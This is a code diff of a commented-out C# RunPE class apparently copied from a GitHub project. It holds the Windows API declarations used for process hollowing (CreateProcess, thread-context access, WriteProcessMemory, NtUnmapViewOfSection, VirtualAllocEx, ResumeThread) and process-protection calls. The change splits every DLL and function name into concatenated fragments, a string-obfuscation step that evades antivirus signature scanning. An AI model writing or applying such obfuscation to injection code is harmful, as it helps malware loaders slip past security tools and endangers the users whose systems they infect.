@@ -325,25 +325,25 @@
 //    {
 //        //github.com/Artiist/RunPE-Process-Protection/blob/master/RunPE.cs
 
-//        [DllImport("kernel32.dll", EntryPoint = "CreateProcess", CharSet = CharSet.Unicode), SuppressUnmanagedCodeSecurity]
+//        [DllImport("kernel3" + "2.dll", EntryPoint = "Cre" + "ateP" + "rocess", CharSet = CharSet.Unicode), SuppressUnmanagedCodeSecurity]
 //        private static extern bool CreateProcess(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes, bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref StartupInformation startupInfo, ref ProcessInformation processInformation);
-//        [DllImport("kernel32.dll", EntryPoint = "GetThreadContext"), SuppressUnmanagedCodeSecurity]
+//        [DllImport("ke" + "rnel32.dll", EntryPoint = "GetT" + "hreadC" + "ontext"), SuppressUnmanagedCodeSecurity]
 //        private static extern bool GetThreadContext(IntPtr thread, int[] context);
-//        [DllImport("kernel32.dll", EntryPoint = "Wow64GetThreadContext"), SuppressUnmanagedCodeSecurity]
+//        [DllImport("kernel" + "32.dll", EntryPoint = "Wow64G" + "etThre" + "adContext"), SuppressUnmanagedCodeSecurity]
 //        private static extern bool Wow64GetThreadContext(IntPtr thread, int[] context);
-//        [DllImport("kernel32.dll", EntryPoint = "SetThreadContext"), SuppressUnmanagedCodeSecurity]
+//        [DllImport("ker" + "nel32.dll", EntryPoint = "SetT" + "hread" + "Context"), SuppressUnmanagedCodeSecurity]
 //        private static extern bool SetThreadContext(IntPtr thread, int[] context);
-//        [DllImport("kernel32.dll", EntryPoint = "Wow64SetThreadContext"), SuppressUnmanagedCodeSecurity]
+//        [DllImport("kernel" + "32.dll", EntryPoint = "Wow64SetTh" + "read" + "Context"), SuppressUnmanagedCodeSecurity]
 //        private static extern bool Wow64SetThreadContext(IntPtr thread, int[] context);
-//        [DllImport("kernel32.dll", EntryPoint = "ReadProcessMemory"), SuppressUnmanagedCodeSecurity]
+//        [DllImport("ker" + "nel32.dll", EntryPoint = "Rea" + "dProcessM" + "emory"), SuppressUnmanagedCodeSecurity]
 //        private static extern bool ReadProcessMemory(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);
-//        [DllImport("kernel32.dll", EntryPoint = "WriteProcessMemory"), SuppressUnmanagedCodeSecurity]
+//        [DllImport("kern" + "el32.dll", EntryPoint = "WritePr" + "ocessMem\"+\"ory"), SuppressUnmanagedCodeSecurity]
 //        private static extern bool WriteProcessMemory(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);
-//        [DllImport("ntdll.dll", EntryPoint = "NtUnmapViewOfSection"), SuppressUnmanagedCodeSecurity]
+//        [DllImport("ntdll." + "dll", EntryPoint = "NtUnmapView" + "OfSection"), SuppressUnmanagedCodeSecurity]
 //        private static extern int NtUnmapViewOfSection(IntPtr process, int baseAddress);
-//        [DllImport("kernel32.dll", EntryPoint = "VirtualAllocEx"), SuppressUnmanagedCodeSecurity]
+//        [DllImport("kerne" + "l32.dll", EntryPoint = "Virt" + "ualAl" + "locEx"), SuppressUnmanagedCodeSecurity]
 //        private static extern int VirtualAllocEx(IntPtr handle, int address, int length, int type, int protect);
-//        [DllImport("kernel32.dll", EntryPoint = "ResumeThread"), SuppressUnmanagedCodeSecurity]
+//        [DllImport("kern" + "el32.dll", EntryPoint = "Resume" + "Thread"), SuppressUnmanagedCodeSecurity]
 //        private static extern int ResumeThread(IntPtr handle);
 //        [StructLayout(LayoutKind.Sequential, Pack = 2 - 1)]
 //        private struct ProcessInformation
@@ -444,10 +444,10 @@
 //            return true;
 //        }
 
-//        [DllImport("advapi32.dll", SetLastError = true)]
+//        [DllImport("advap" + "i32.dll", SetLastError = true)]
 //        private static extern bool GetKernelObjectSecurity(IntPtr Handle, int securityInformation, [Out] byte[] pSecurityDescriptor, uint nLength, ref uint lpnLengthNeeded);
 
-//        [DllImport("advapi32.dll", SetLastError = true)]
+//        [DllImport("adva" + "pi32.dll", SetLastError = true)]
 //        private static extern bool SetKernelObjectSecurity(IntPtr Handle, int securityInformation, [In] byte[] pSecurityDescriptor);
 
 //        private static void SetProcessSecurityDescriptor(IntPtr processHandle, RawSecurityDescriptor rawSecurityDescriptor)
